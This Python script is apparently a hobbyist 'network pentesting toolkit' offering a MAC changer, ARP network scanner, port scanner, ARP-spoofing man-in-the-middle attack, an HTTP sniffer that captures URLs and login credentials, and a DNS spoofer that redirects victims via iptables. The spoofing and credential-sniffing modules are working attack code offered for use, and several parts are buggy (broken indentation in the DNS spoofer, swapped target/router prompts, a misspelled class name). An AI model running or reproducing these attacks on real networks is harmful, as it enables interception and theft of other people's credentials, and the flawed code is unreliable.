#!/usr/bin/python3
## Network pentesting Toolkit by Mrk
## Install scapy layers and netfilterque using pip

import subprocess
import argparse
import time
import sys
import re
import socket
import scapy.all as scapy
import netfilterqueue
from scapy.layers import http


print("""                                             		                         
                        @@@%%%%%%&@@@                       
                     @@@%%%%%%%%%%%%%@@@                    
                   @@%%%%%%%%%%%%%%%%%%%@@                  
                 @@%%%%%%%%%%%%%%%%%%%%%%%@@                
                @@%%%%%%%%%%%%%%%%%%%%%%%%%@@               
              /@%%%%%%%%%%%%%%%%%%%%%%%%%%%%&@(             
              @@%%@@@@..................@@@@%%@@             
             @@@@&@@%@.................@@@@&@@@@            
              @@&&&@@@.................@@@&&&@@             
               @@&&&&@@...............@@&&&&@@              
                @@&&&&&@@...........@@&&&&&@@               
                 @@@&&&&@@@@.....@@@&&&&&@@,                
                 ,@@@@@@@@@.../...&@@@@@@@@,                
          @@.%%%%%%%%%%%%%%%@@@@@%%%%%%%%%%%%%%%#@@           
        @@                                      ...@@       
        ,@                  @@@@@              ....@@       
        %@&             @@ @@@@@@@ @@          ...(@%       
      @@%@@              .@@@@@@@@@.           ...@@%@@     
    @@%%%@@             #(@@((@((@@((          ...@@%%%@@   
    @@%%%%@.            @@@@((@((@@@@         ....@&%%%@@   
     @@%%%@@            @   @@@@@   @         ...@@%%%@@    
      @@%%@@                                  ...@@%%@@     
       @@*......................................,,,,@@          
	""")
print("""
 -
  _   _      _                      _      _______          _      
 | \ | |    | |                    | |    |__   __|        | |     
 |  \| | ___| |___      _____  _ __| | __    | | ___   ___ | |___  
 | . ` |/ _ \ __\ \ /\ / / _ \| '__| |/ /    | |/ _ \ / _ \| / __| 
 | |\  |  __/ |_ \ V  V / (_) | |  |   <     | | (_) | (_) | \__ \ 
 |_| \_|\___|\__| \_/\_/ \___/|_|  |_|\_\    |_|\___/ \___/|_|___/ \n""")

print("[+] Welcome, what do you wish to do ?")
print("---------------------------------")
print("[1] MAC address changer")
print("[2] Network Scanner")
print("[3] Port Scanner")
print("[4] Arp spoofing attack")
print("[5] Password and Url sniffer")
print("[6] DNS Spoofer")
print("---------------------------------")

option = int(input("[+] Where do you want to start ?: "))

## MAC ADDRESS CHANGER ##
def mac_changer():
	def change_mac(interface, new_mac):
		print("[+] Changing MAC address for " + interface + " to " + new_mac)
		subprocess.call(["ifconfig", interface, "down"])
		subprocess.call(["ifconfig", interface, "hw", "ether", new_mac])
		subprocess.call(["ifconfig", interface, "up"])

	def read_current_mac(interface):
		ifconfig_result = subprocess.check_output(["ifconfig", interface])
		mac_address_search_result = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(ifconfig_result))
		
		if mac_address_search_result:
			return mac_address_search_result.group(0)
		else:
			print("[-] Could not get MAC address")

	i = input("[+] Please specify the interface you wish to change the MAC address for: ")
	m = input("[+] Please enter the new MAC address you wish to have: ")

	current_mac = read_current_mac(i)
	print("[+] Current MAC address:  " + str(current_mac))


	change_mac(i, m)

	current_mac = read_current_mac(i)
	if current_mac == m:
		print("[+] MAC address successfully changed")
	else:
		print("[-] MAC address did not change")

## NETWORK SCANNER ##
def net_scan():
	def scan(ip):
		arp_request = scapy.ARP(pdst=ip)
		broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
		arp_request_broadcast = broadcast/arp_request
		answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
		# Create and empty list which will store all dictionaries
		clients_list = []
		for element in answered_list:
			# For each element in list creates a dictionary that contains a key called ip and a key called mac 
			client_dic = {"ip": element[1].psrc, "mac": element[1].hwsrc}
			# Adding every dictionary to clients_list
			clients_list.append(client_dic)
		return clients_list
	def print_result(results_list):
			print("\n\nIP\t\t\tMAC Address\n------------------------------------------")
			for client in results_list:
				print(client["ip"] + "\t\t" + client["mac"])

	target = input("[+] Please, set IP range you wish to scan: ")
	scan_result = scan(target)
	print_result(scan_result)

## 	PORT SCANNER ##
def port_scan():
	ip_add_pattern = re.compile("^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
	port_range_pattern = re.compile("([0-9]+)-([0-9]+)")
	port_min = 0
	port_max = 65535
	open_ports = []
	while True:
	    ip_add_entered = input("[+] Please enter the ip address you wish to scan: ")
	    if ip_add_pattern.search(ip_add_entered):
	        print(f"[+] {ip_add_entered} is a valid ip address")
	        break

	while True:
	    port_range = input("[+] Please enter the range of ports you want to scan like so: 23-80...  ")
	    port_range_valid = port_range_pattern.search(port_range.replace(" ",""))
	    if port_range_valid:
	        port_min = int(port_range_valid.group(1))
	        port_max = int(port_range_valid.group(2))
	        break

	for port in range(port_min, port_max + 1):
	    try:
	        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:    
	            s.settimeout(0.5)
	            s.connect((ip_add_entered, port))
	            open_ports.append(port)

	    except:
	        print(f"[-] Port {port} is closed on {ip_add_entered}.")
	for port in open_ports:
	    print(f"[+] Port {port} is open on {ip_add_entered}.")

## ARP SPOOF ##
def arp_spoof():
	def get_mac(ip):
		arp_request = scapy.ARP(pdst=ip)
		broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
		arp_request_broadcast = broadcast/arp_request
		answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
		
		return answered_list[0][1].hwsrc

	def spoof(target_ip, spoof_ip):
		target_mac = get_mac(target_ip)
		# Create ARP packet and send it to target
		packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
		scapy.send(packet, verbose=False)

	def restore(dest_ip, src_ip):
		dest_mac = get_mac(dest_ip)
		src_mac = get_mac(src_ip)
		packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
		scapy.send(packet, verbose=False)

	router_ip = input("[+] Enter the target ip address: ")
	target_ip = input("[+] Enter the router ip address: ")

	sent_packets_count = 0 
	try:
		while True:
			spoof(target_ip, router_ip)
			spoof(router_ip, target_ip)
			sent_packets_count = sent_packets_count + 2
			print("\r[+] Packets sent: " + str(sent_packets_count), end="")
			time.sleep(2)
	except KeyboardInterrupt:
		print("\n[+]Program ended by user, quitting and restorin ARP tables...")
		restore(target_ip, router_ip)

	# Run echo 1 > /proc/sys/net/ipv4/ip_forward to forward traffic

## P*SSWRD AND URL SNIFFER ##
def psswd_url_sniff():
	def sniff(interface):
		scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="")
	
	def get_url(packet):
		return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

	def get_login(packet):
		if packet.haslayer(scapy.Raw):
				
				load = str(packet[scapy.Raw].load)
				
				keywords = ["username", "password", "user", "passwd", "usr", "login", "pass"]
				for keyword in keywords:
					if keyword in load:
						return load

	def process_sniffed_packet(packet):
		if packet.haslayer(http.HTTPRequest):
			
			url = get_url(packet)
			print("[+] HTTPRequest >> " + url.decode())

			login_info = get_login(packet)
			if login_info:
				print("\n\n[+] Possible login info >> " + login_info + "\n\n\n")
			
	interface = input("[+] Interface you wish to use for sniffing attack: ")
	sniff(interface)

## DNS SPOOFER
def dns_spoofer():
	try:
	print("[+] Creating queue 0 with iptables...")
	subprocess.call(["iptables -I FORWARD -j NFQUEUE --queue-num 0"])
	
	def process_packet(packet):
		www = input("[+] Please enter the domain you wish to spoof: \n")
		ip_h = input("[+] IP you wish to redirect your target to: \n")
		scapy_packet = scapy.IP(packet.get_payload())
		if scapy_packet.haslayer(scapy.DNSRR):
			qname = scapy_packet[scapy.DNSQR].qname
			if www in qname:
				print("[+] Spoofing target...")
				answer = scapy.DNSRR(rrname=qname, rdata=ip_h)
				scapy_packet[scapy.DNS].an = answer
				scapy_packet[scapy.DNS].ancount = 1
				# Delete lenght and checksum fields
				del scapy_packet[scapy.IP].len
				del scapy_packet[scapy.IP].cksum
				del scapy_packet[scapy.UDP].len
				del scapy_packet[scapy.UDP].cksum
				# Set payload for original packet
				packet.set_payload(str(scapy_packet))
		packet.accept()
	
	queue = netfilterqueue.Netfilterqueue()
	queue.bind(0, process_packet)
	queue.run()

	except KeyboardInterrupt:
		print("[-] Exiting program, restoring iptables...")
		subprocess.call(["iptables --flush"])

if option == 1:
	mac_changer()
elif option == 2:
	net_scan()
elif option == 3:
	port_scan()
elif option == 4:
	arp_spoof()
elif option == 5:
	psswd_url_sniff()
elif option == 6:
	dns_spoofer()
else:
	print("[-] None of the options were chosen, exiting...")
